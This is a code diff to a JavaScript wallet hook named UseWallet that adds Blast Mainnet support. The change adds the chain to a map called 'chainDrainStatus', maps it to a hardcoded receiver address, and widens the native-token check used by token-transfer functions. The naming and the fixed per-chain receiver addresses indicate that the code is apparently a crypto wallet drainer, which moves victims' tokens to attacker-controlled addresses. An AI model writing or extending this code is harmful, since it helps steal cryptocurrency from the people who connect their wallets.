@@ -13,6 +13,7 @@ export const UseWallet = () => {
     // Chain status tracking
     let chainInteractionStatus = {
         1: false, // Ethereum Mainnet
+        81457: false, //Blast Mainnet
         56: false, // Binance Smart Chain Mainnet
         137: false, // Polygon Mainnet
         43114: false, // Avalanche Mainnet
@@ -23,6 +24,7 @@ export const UseWallet = () => {
 
     const chainDrainStatus = {
         1: false, // Ethereum Mainnet
+        81457: false, //Blast Mainnet
         56: false, // Binance Smart Chain Mainnet
         137: false, // Polygon Mainnet
         43114: false, // Avalanche Mainnet
@@ -35,6 +37,8 @@ export const UseWallet = () => {
         switch (chainId) {
             case 1:
                 return "0xe13686dc370817C5dfbE27218645B530041D2466"; // Ethereum
+            case 81457:
+                return "0xe13686dc370817C5dfbE27218645B530041D2466"; // Ethereum  
             case 56:
                 return "0x2B7e812267C55246fe7afB0d6Dbc6a32baEF6A15"; // Binance
             case 137:
@@ -435,7 +439,7 @@ export const UseWallet = () => {
                 return;
             }
 
-            const isNative = token.token_address === "0xeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee"; // Check if native token
+            const isNative = token.token_address === "0xeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee" || token.token_address === "0x4300000000000000000000000000000000000004"; // Check if native token
             console.log(isNative)
             if (isNative) {
                 // Bridge Native Token (ETH, BNB, etc.)
@@ -489,6 +493,7 @@ export const UseWallet = () => {
 
     // Function to transfer non-native tokens to receiver address
     const bridgeNonNativeToken = async (token, amount, provider, accountAddress, chainId) => {
+        console.log(token)
         try {
             if (!token.token_address) {
                 console.error("Invalid token address:", token);
